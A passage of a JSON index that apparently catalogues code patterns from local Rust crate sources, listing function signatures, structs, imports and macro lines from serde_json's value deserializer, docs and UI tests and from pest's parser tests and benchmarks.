          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_option<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_enum<V>(",
          "fn deserialize_newtype_struct<V>(",
          "fn deserialize_bool<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_char<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_str<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_string<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_bytes<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_byte_buf<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_unit<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_unit_struct<V>(self, _name: &'static str, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_seq<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_tuple<V>(self, _len: usize, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_tuple_struct<V>(",
          "fn deserialize_map<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_struct<V>(",
          "fn deserialize_identifier<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_ignored_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn variant_seed<V>(self, seed: V) -> Result<(V::Value, VariantDeserializer), Error>",
          "fn into_deserializer(self) -> Self::Deserializer {",
          "fn into_deserializer(self) -> Self::Deserializer {",
          "fn unit_variant(self) -> Result<(), Error> {",
          "fn newtype_variant_seed<T>(self, seed: T) -> Result<T::Value, Error>",
          "fn tuple_variant<V>(self, _len: usize, visitor: V) -> Result<V::Value, Error>",
          "fn struct_variant<V>(",
          "fn new(vec: Vec<Value>) -> Self {",
          "fn next_element_seed<T>(&mut self, seed: T) -> Result<Option<T::Value>, Error>",
          "fn size_hint(&self) -> Option<usize> {",
          "fn new(map: Map<String, Value>) -> Self {",
          "fn next_key_seed<T>(&mut self, seed: T) -> Result<Option<T::Value>, Error>",
          "fn next_value_seed<T>(&mut self, seed: T) -> Result<T::Value, Error>",
          "fn size_hint(&self) -> Option<usize> {",
          "fn $method<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn $method<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn visit_array_ref<'de, V>(array: &'de [Value], visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Self::Error>",
          "fn deserialize_enum<V>(",
          "fn deserialize_ignored_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_option<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_enum<V>(",
          "fn deserialize_newtype_struct<V>(",
          "fn deserialize_bool<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_char<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_str<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_string<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_bytes<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_byte_buf<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_unit<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_unit_struct<V>(self, _name: &'static str, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_seq<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_tuple<V>(self, _len: usize, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_tuple_struct<V>(",
          "fn deserialize_map<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_struct<V>(",
          "fn deserialize_identifier<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_ignored_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn variant_seed<V>(self, seed: V) -> Result<(V::Value, Self::Variant), Error>",
          "fn unit_variant(self) -> Result<(), Error> {",
          "fn newtype_variant_seed<T>(self, seed: T) -> Result<T::Value, Error>",
          "fn tuple_variant<V>(self, _len: usize, visitor: V) -> Result<V::Value, Error>",
          "fn struct_variant<V>(",
          "fn new(slice: &'de [Value]) -> Self {",
          "fn next_element_seed<T>(&mut self, seed: T) -> Result<Option<T::Value>, Error>",
          "fn size_hint(&self) -> Option<usize> {",
          "fn new(map: &'de Map<String, Value>) -> Self {",
          "fn next_key_seed<T>(&mut self, seed: T) -> Result<Option<T::Value>, Error>",
          "fn next_value_seed<T>(&mut self, seed: T) -> Result<T::Value, Error>",
          "fn size_hint(&self) -> Option<usize> {",
          "fn $method<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_bool<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_option<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_newtype_struct<V>(",
          "fn deserialize_enum<V>(",
          "fn deserialize<D>(self, deserializer: D) -> Result<Self::Value, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_str<E>(self, s: &str) -> Result<Self::Value, E>",
          "fn visit_string<E>(self, s: String) -> Result<Self::Value, E>",
          "fn invalid_type<E>(&self, exp: &dyn Expected) -> E",
          "fn unexpected(&self) -> Unexpected {",
          "fn new(value: Cow<'de, str>) -> Self {",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_enum<V>(",
          "fn variant_seed<T>(self, seed: T) -> Result<(T::Value, Self::Variant), Error>",
          "fn unit_variant(self) -> Result<(), Error> {",
          "fn newtype_variant_seed<T>(self, _seed: T) -> Result<T::Value, Error>",
          "fn tuple_variant<V>(self, _len: usize, _visitor: V) -> Result<V::Value, Error>",
          "fn struct_variant<V>("
        ],
        "struct_defs": [
          "struct ValueVisitor;",
          "struct EnumDeserializer {",
          "struct VariantDeserializer {",
          "struct SeqDeserializer {",
          "struct MapDeserializer {",
          "struct EnumRefDeserializer<'de> {",
          "struct VariantRefDeserializer<'de> {",
          "struct SeqRefDeserializer<'de> {",
          "struct MapRefDeserializer<'de> {",
          "struct MapKeyDeserializer<'de> {",
          "struct KeyClassifier;",
          "struct BorrowedCowStrDeserializer<'de> {",
          "struct UnitOnly;"
        ],
        "impl_blocks": [
          "impl FromStr for Value {",
          "impl FromStr for Map<String, Value> {",
          "impl SeqDeserializer {",
          "impl MapDeserializer {",
          "impl Value {"
        ],
        "uses": [
          "use crate::error::{Error, ErrorCode};",
          "use crate::map::Map;",
          "use crate::number::Number;",
          "use crate::value::Value;",
          "use alloc::borrow::{Cow, ToOwned};",
          "use alloc::string::String;",
          "use alloc::string::ToString;",
          "use alloc::vec::{self, Vec};",
          "use core::fmt;",
          "use core::slice;",
          "use core::str::FromStr;",
          "use serde::de::{",
          "use serde::forward_to_deserialize_any;",
          "use crate::number::NumberFromString;"
        ],
        "macros": [
          "while let Some(elem) = tri!(visitor.next_element()) {",
          "match tri!(visitor.next_key_seed(KeyClassifier)) {",
          "let number: NumberFromString = tri!(visitor.next_value());",
          "let value = tri!(visitor.next_value_seed(crate::raw::BoxedFromString));",
          "values.insert(first_key, tri!(visitor.next_value()));",
          "while let Some((key, value)) = tri!(visitor.next_entry()) {",
          "let seq = tri!(visitor.visit_seq(&mut deserializer));",
          "let map = tri!(visitor.visit_map(&mut deserializer));",
          "Value::String(_) => unreachable!(),",
          "deserialize_number!(deserialize_i8);",
          "deserialize_number!(deserialize_i16);",
          "deserialize_number!(deserialize_i32);",
          "deserialize_number!(deserialize_i64);",
          "deserialize_number!(deserialize_i128);",
          "deserialize_number!(deserialize_u8);",
          "deserialize_number!(deserialize_u16);",
          "deserialize_number!(deserialize_u32);",
          "deserialize_number!(deserialize_u64);",
          "deserialize_number!(deserialize_u128);",
          "deserialize_number!(deserialize_f32);",
          "deserialize_number!(deserialize_f64);",
          "let seq = tri!(visitor.visit_seq(&mut deserializer));",
          "let map = tri!(visitor.visit_map(&mut deserializer));",
          "deserialize_value_ref_number!(deserialize_i8);",
          "deserialize_value_ref_number!(deserialize_i16);",
          "deserialize_value_ref_number!(deserialize_i32);",
          "deserialize_value_ref_number!(deserialize_i64);",
          "deserialize_number!(deserialize_i128);",
          "deserialize_value_ref_number!(deserialize_u8);",
          "deserialize_value_ref_number!(deserialize_u16);",
          "deserialize_value_ref_number!(deserialize_u32);",
          "deserialize_value_ref_number!(deserialize_u64);",
          "deserialize_number!(deserialize_u128);",
          "deserialize_value_ref_number!(deserialize_f32);",
          "deserialize_value_ref_number!(deserialize_f64);",
          "deserialize_numeric_key!($method, deserialize_number);",
          "match tri!(de.peek()) {",
          "let number = tri!(de.$using(visitor));",
          "if tri!(de.peek()).is_some() {",
          "deserialize_numeric_key!(deserialize_i8);",
          "deserialize_numeric_key!(deserialize_i16);",
          "deserialize_numeric_key!(deserialize_i32);",
          "deserialize_numeric_key!(deserialize_i64);",
          "deserialize_numeric_key!(deserialize_u8);",
          "deserialize_numeric_key!(deserialize_u16);",
          "deserialize_numeric_key!(deserialize_u32);",
          "deserialize_numeric_key!(deserialize_u64);",
          "deserialize_numeric_key!(deserialize_f32);",
          "deserialize_numeric_key!(deserialize_f64);",
          "deserialize_numeric_key!(deserialize_f32, do_deserialize_f32);",
          "deserialize_numeric_key!(deserialize_i128, do_deserialize_i128);",
          "deserialize_numeric_key!(deserialize_u128, do_deserialize_u128);",
          "Cow::Owned(_) => unreachable!(),",
          "let value = tri!(seed.deserialize(self));"
        ],
        "derives": [],
        "error_handling": 50
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/value/mod.rs",
        "function_defs": [
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {",
          "fn io_error(_: fmt::Error) -> io::Error {",
          "fn parse_index(s: &str) -> Option<usize> {",
          "fn default() -> Value {",
          "fn default() -> Self {"
        ],
        "struct_defs": [
          "struct WriterFormatter<'a, 'b: 'a> {"
        ],
        "impl_blocks": [
          "impl Debug for Value {",
          "impl Display for Value {",
          "impl Value {",
          "impl Default for Value {",
          "impl Default for &Value {"
        ],
        "uses": [
          "use crate::error::Error;",
          "use crate::io;",
          "use alloc::string::String;",
          "use alloc::vec::Vec;",
          "use core::fmt::{self, Debug, Display};",
          "use core::mem;",
          "use core::str;",
          "use serde::de::DeserializeOwned;",
          "use serde::ser::Serialize;"
        ],
        "macros": [
          "//!     let john = json!({",
          "//!     println!(\"first phone number: {}\", john[\"phones\"][0]);",
          "//!     println!(\"{}\", john.to_string());",
          "//! let john = json!({",
          "//!         format!(\"+44 {}\", random_phone())",
          "//!     println!(\"Please call {} at the number {}\", v[\"name\"], v[\"phones\"][0]);",
          "/// let v = json!(null);",
          "/// let v = json!(true);",
          "/// let v = json!(12.5);",
          "/// let v = json!(\"a string\");",
          "/// let v = json!([\"an\", \"array\"]);",
          "/// let v = json!({ \"an\": \"object\" });",
          "Value::Bool(boolean) => write!(formatter, \"Bool({})\", boolean),",
          "Value::String(string) => write!(formatter, \"String({:?})\", string),",
          "tri!(formatter.write_str(\"Array \"));",
          "tri!(formatter.write_str(\"Object \"));",
          "/// let json = json!({ \"city\": \"London\", \"street\": \"10 Downing Street\" });",
          "/// let compact = format!(\"{}\", json);",
          "/// assert_eq!(compact,",
          "/// let pretty = format!(\"{:#}\", json);",
          "/// assert_eq!(pretty,",
          "tri!(self.inner.write_str(s).map_err(io_error));",
          "/// let object = json!({ \"A\": 65, \"B\": 66, \"C\": 67 });",
          "/// assert_eq!(*object.get(\"A\").unwrap(), json!(65));",
          "/// let array = json!([ \"A\", \"B\", \"C\" ]);",
          "/// assert_eq!(*array.get(2).unwrap(), json!(\"C\"));",
          "/// assert_eq!(array.get(\"A\"), None);",
          "/// let object = json!({",
          "/// assert_eq!(object[\"B\"][0], json!(\"b\"));",
          "/// assert_eq!(object[\"D\"], json!(null));",
          "/// assert_eq!(object[0][\"x\"][\"y\"][\"z\"], json!(null));",
          "/// let mut object = json!({ \"A\": 65, \"B\": 66, \"C\": 67 });",
          "/// *object.get_mut(\"A\").unwrap() = json!(69);",
          "/// let mut array = json!([ \"A\", \"B\", \"C\" ]);",
          "/// *array.get_mut(2).unwrap() = json!(\"D\");",
          "/// let obj = json!({ \"a\": { \"nested\": true }, \"b\": [\"an\", \"array\"] });",
          "/// assert!(obj.is_object());",
          "/// assert!(obj[\"a\"].is_object());",
          "/// assert!(!obj[\"b\"].is_object());",
          "/// let v = json!({ \"a\": { \"nested\": true }, \"b\": [\"an\", \"array\"] });",
          "/// assert_eq!(v[\"a\"].as_object().unwrap().len(), 1);",
          "/// assert_eq!(v[\"b\"].as_object(), None);",
          "/// let mut v = json!({ \"a\": { \"nested\": true } });",
          "/// assert_eq!(v, json!({ \"a\": {} }));",
          "/// let obj = json!({ \"a\": [\"an\", \"array\"], \"b\": { \"an\": \"object\" } });",
          "/// assert!(obj[\"a\"].is_array());",
          "/// assert!(!obj[\"b\"].is_array());",
          "/// let v = json!({ \"a\": [\"an\", \"array\"], \"b\": { \"an\": \"object\" } });",
          "/// assert_eq!(v[\"a\"].as_array().unwrap().len(), 2);",
          "/// assert_eq!(v[\"b\"].as_array(), None);",
          "/// let mut v = json!({ \"a\": [\"an\", \"array\"] });",
          "/// assert_eq!(v, json!({ \"a\": [] }));",
          "/// let v = json!({ \"a\": \"some string\", \"b\": false });",
          "/// assert!(v[\"a\"].is_string());",
          "/// assert!(!v[\"b\"].is_string());",
          "/// let v = json!({ \"a\": \"some string\", \"b\": false });",
          "/// assert_eq!(v[\"a\"].as_str(), Some(\"some string\"));",
          "/// assert_eq!(v[\"b\"].as_str(), None);",
          "/// println!(\"The value is: {}\", v[\"a\"]);",
          "/// println!(\"The value is: {}\", v[\"a\"].as_str().unwrap());",
          "/// let v = json!({ \"a\": 1, \"b\": \"2\" });",
          "/// assert!(v[\"a\"].is_number());",
          "/// assert!(!v[\"b\"].is_number());",
          "/// let v = json!({ \"a\": 1, \"b\": 2.2, \"c\": -3, \"d\": \"4\" });",
          "/// assert_eq!(v[\"a\"].as_number(), Some(&Number::from(1u64)));",
          "/// assert_eq!(v[\"b\"].as_number(), Some(&Number::from_f64(2.2).unwrap()));",
          "/// assert_eq!(v[\"c\"].as_number(), Some(&Number::from(-3i64)));",
          "/// assert_eq!(v[\"d\"].as_number(), None);",
          "/// let v = json!({ \"a\": 64, \"b\": big, \"c\": 256.0 });",
          "/// assert!(v[\"a\"].is_i64());",
          "/// assert!(!v[\"b\"].is_i64());",
          "/// assert!(!v[\"c\"].is_i64());",
          "/// let v = json!({ \"a\": 64, \"b\": -64, \"c\": 256.0 });",
          "/// assert!(v[\"a\"].is_u64());",
          "/// assert!(!v[\"b\"].is_u64());",
          "/// assert!(!v[\"c\"].is_u64());",
          "/// let v = json!({ \"a\": 256.0, \"b\": 64, \"c\": -64 });",
          "/// assert!(v[\"a\"].is_f64());",
          "/// assert!(!v[\"b\"].is_f64());",
          "/// assert!(!v[\"c\"].is_f64());",
          "/// let v = json!({ \"a\": 64, \"b\": big, \"c\": 256.0 });",
          "/// assert_eq!(v[\"a\"].as_i64(), Some(64));",
          "/// assert_eq!(v[\"b\"].as_i64(), None);",
          "/// assert_eq!(v[\"c\"].as_i64(), None);",
          "/// let v = json!({ \"a\": 64, \"b\": -64, \"c\": 256.0 });",
          "/// assert_eq!(v[\"a\"].as_u64(), Some(64));",
          "/// assert_eq!(v[\"b\"].as_u64(), None);",
          "/// assert_eq!(v[\"c\"].as_u64(), None);",
          "/// let v = json!({ \"a\": 256.0, \"b\": 64, \"c\": -64 });",
          "/// assert_eq!(v[\"a\"].as_f64(), Some(256.0));",
          "/// assert_eq!(v[\"b\"].as_f64(), Some(64.0));",
          "/// assert_eq!(v[\"c\"].as_f64(), Some(-64.0));",
          "/// let v = json!({ \"a\": false, \"b\": \"false\" });",
          "/// assert!(v[\"a\"].is_boolean());",
          "/// assert!(!v[\"b\"].is_boolean());",
          "/// let v = json!({ \"a\": false, \"b\": \"false\" });",
          "/// assert_eq!(v[\"a\"].as_bool(), Some(false));",
          "/// assert_eq!(v[\"b\"].as_bool(), None);",
          "/// let v = json!({ \"a\": null, \"b\": false });",
          "/// assert!(v[\"a\"].is_null());",
          "/// assert!(!v[\"b\"].is_null());",
          "/// let v = json!({ \"a\": null, \"b\": false });",
          "/// assert_eq!(v[\"a\"].as_null(), Some(()));",
          "/// assert_eq!(v[\"b\"].as_null(), None);",
          "/// let data = json!({",
          "/// assert_eq!(data.pointer(\"/x/y/1\").unwrap(), &json!(\"zz\"));",
          "/// assert_eq!(data.pointer(\"/a/b/c\"), None);",
          "///     assert_eq!(value.pointer(\"/x\"), Some(&1.0.into()));",
          "///     assert_eq!(value.pointer(\"/x\"), Some(&1.5.into()));",
          "///     assert_eq!(old_x, 1.5);",
          "///     assert_eq!(value.pointer(\"/x\").unwrap(), &Value::Null);",
          "/// let mut v = json!({ \"x\": \"y\" });",
          "/// assert_eq!(v[\"x\"].take(), json!(\"y\"));",
          "/// assert_eq!(v, json!({ \"x\": null }));",
          "/// assert_eq!(s.level, 42);",
          "/// assert_eq!(s.extras, Value::Null);",
          "///     let expected = json!({",
          "///     assert_eq!(v, expected);",
          "///     println!(\"{}\", serde_json::to_value(map).unwrap_err());",
          "///     let j = json!({",
          "///     println!(\"{:#?}\", u);"
        ],
        "derives": [
          "#[derive(Clone, Eq, PartialEq, Hash)]"
        ],
        "error_handling": 46
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/value/from.rs",
        "function_defs": [
          "fn from(n: $ty) -> Self {",
          "fn from(f: f32) -> Self {",
          "fn from(f: f64) -> Self {",
          "fn from(f: bool) -> Self {",
          "fn from(f: String) -> Self {",
          "fn from(f: &str) -> Self {",
          "fn from(f: Cow<'a, str>) -> Self {",
          "fn from(f: Number) -> Self {",
          "fn from(f: Map<String, Value>) -> Self {",
          "fn from(f: Vec<T>) -> Self {",
          "fn from(array: [T; N]) -> Self {",
          "fn from(f: &[T]) -> Self {",
          "fn from_iter<I: IntoIterator<Item = T>>(iter: I) -> Self {",
          "fn from_iter<I: IntoIterator<Item = (K, V)>>(iter: I) -> Self {",
          "fn from((): ()) -> Self {",
          "fn from(opt: Option<T>) -> Self {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl From<$ty> for Value {",
          "impl From<f32> for Value {",
          "impl From<f64> for Value {",
          "impl From<bool> for Value {",
          "impl From<String> for Value {",
          "impl From<&str> for Value {",
          "impl From<Number> for Value {",
          "impl From<Map<String, Value>> for Value {",
          "impl From<()> for Value {"
        ],
        "uses": [
          "use super::Value;",
          "use crate::map::Map;",
          "use crate::number::Number;",
          "use alloc::borrow::{Cow, ToOwned};",
          "use alloc::string::String;",
          "use alloc::vec::Vec;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/value/partial_eq.rs",
        "function_defs": [
          "fn eq_i64(value: &Value, other: i64) -> bool {",
          "fn eq_u64(value: &Value, other: u64) -> bool {",
          "fn eq_f32(value: &Value, other: f32) -> bool {",
          "fn eq_f64(value: &Value, other: f64) -> bool {",
          "fn eq_bool(value: &Value, other: bool) -> bool {",
          "fn eq_str(value: &Value, other: &str) -> bool {",
          "fn eq(&self, other: &str) -> bool {",
          "fn eq(&self, other: &&str) -> bool {",
          "fn eq(&self, other: &Value) -> bool {",
          "fn eq(&self, other: &Value) -> bool {",
          "fn eq(&self, other: &String) -> bool {",
          "fn eq(&self, other: &Value) -> bool {",
          "fn eq(&self, other: &$ty) -> bool {",
          "fn eq(&self, other: &Value) -> bool {",
          "fn eq(&self, other: &$ty) -> bool {",
          "fn eq(&self, other: &$ty) -> bool {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl PartialEq<str> for Value {",
          "impl PartialEq<&str> for Value {",
          "impl PartialEq<Value> for str {",
          "impl PartialEq<Value> for &str {",
          "impl PartialEq<String> for Value {",
          "impl PartialEq<Value> for String {",
          "impl PartialEq<$ty> for Value {",
          "impl PartialEq<Value> for $ty {"
        ],
        "uses": [
          "use super::Value;",
          "use alloc::string::String;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/ui/missing_comma.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_json::json;"
        ],
        "macros": [
          "json!({ \"1\": \"\" \"2\": \"\" });"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/ui/not_found.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_json::json;"
        ],
        "macros": [
          "json!({ \"a\" : x });"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/ui/parse_key.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_json::json;"
        ],
        "macros": [
          "json!({ \"\".s : true });"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/ui/missing_colon.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_json::json;"
        ],
        "macros": [
          "json!({ \"a\" });"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/ui/unexpected_comma.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_json::json;"
        ],
        "macros": [
          "json!({ \"a\" , \"b\": true });"
        ],
        "derives": [],
        "error_handling": 0
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3",
    "name": "pest-2.8.3",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/tests/json.rs",
        "function_defs": [
          "fn parse(rule: Rule, input: &str) -> Result<Pairs<Rule>, Error<Rule>> {",
          "fn json(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn object(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn pair(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn array(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn value(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn string(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn escape(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn unicode(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn hex(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn number(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn int(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn exp(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn bool(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn null(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn skip(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn consume(pair: Pair<Rule>) -> Json {",
          "fn value(pair: Pair<Rule>) -> Json {",
          "fn null() {",
          "fn bool() {",
          "fn number_zero() {",
          "fn float() {",
          "fn float_with_exp() {",
          "fn number_minus_zero() {",
          "fn string_with_escapes() {",
          "fn array_empty() {",
          "fn array() {",
          "fn object() {",
          "fn ast() {"
        ],
        "struct_defs": [
          "struct JsonParser;"
        ],
        "impl_blocks": [
          "impl Parser<Rule> for JsonParser {"
        ],
        "uses": [
          "use std::collections::HashMap;",
          "use pest::error::Error;",
          "use pest::iterators::{Pair, Pairs};",
          "use pest::{state, ParseResult, Parser, ParserState, Span};"
        ],
        "macros": [
          "_ => unreachable!(),",
          "_ => unreachable!(),",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]",
          "#[derive(Debug, PartialEq)]"
        ],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/tests/calculator.rs",
        "function_defs": [
          "fn parse(rule: Rule, input: &str) -> Result<Pairs<Rule>, Error<Rule>> {",
          "fn expression(",
          "fn primary(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn number(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn plus(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn minus(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn times(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn divide(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn modulus(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn power(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn consume(pair: Pair<Rule>, pratt_or_climber: &PrattOrPrecClimber) -> i32 {",
          "fn number() {",
          "fn parens() {",
          "fn expression() {",
          "fn prec_climb() {",
          "fn pratt_parse() {"
        ],
        "struct_defs": [
          "struct CalculatorParser;"
        ],
        "impl_blocks": [
          "impl Parser<Rule> for CalculatorParser {"
        ],
        "uses": [
          "use pest::error::Error;",
          "use pest::iterators::{Pair, Pairs};",
          "use pest::pratt_parser::{Assoc, Op, PrattParser};",
          "use pest::{state, ParseResult, Parser, ParserState};",
          "use pest::prec_climber::{Assoc, Operator, PrecClimber};"
        ],
        "macros": [
          "_ => unreachable!(),",
          "_ => unreachable!(),",
          "_ => unreachable!(),",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]"
        ],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/examples/parens.rs",
        "function_defs": [
          "fn parse(rule: Rule, input: &str) -> Result<Pairs<Rule>, Error<Rule>> {",
          "fn expr(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn paren(state: Box<ParserState<'_, Rule>>) -> ParseResult<Box<ParserState<'_, Rule>>> {",
          "fn expr(pairs: Pairs<Rule>) -> Vec<Paren> {",
          "fn main() {"
        ],
        "struct_defs": [
          "struct ParenParser;",
          "struct Paren(Vec<Paren>);"
        ],
        "impl_blocks": [
          "impl Parser<Rule> for ParenParser {"
        ],
        "uses": [
          "use std::io::{self, Write};",
          "use pest::error::Error;",
          "use pest::iterators::Pairs;",
          "use pest::{state, ParseResult, Parser, ParserState};"
        ],
        "macros": [
          "_ => unreachable!(),",
          "print!(\"> \");",
          "Ok(pairs) => println!(\"{:?}\", expr(pairs)),",
          "Err(e) => eprintln!(\"\\n{}\", e),",
          "Err(e) => eprintln!(\"\\n{:?}\", e),"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/pest-2.8.3/benches/stack.rs",
        "function_defs": [
          "fn snapshot_push_restore<T: Clone>(elements: impl Iterator<Item = T> + Clone) {",
          "fn snapshot_push_clear_snapshot<T: Clone>(elements: impl Iterator<Item = T> + Clone) {",
          "fn snapshot_pop_restore<T: Clone>(elements: impl Iterator<Item = T>) {",
          "fn snapshot_pop_clear<T: Clone>(elements: impl Iterator<Item = T>) {",
          "fn benchmark(b: &mut Criterion) {"
        ],
        "struct_defs": [],
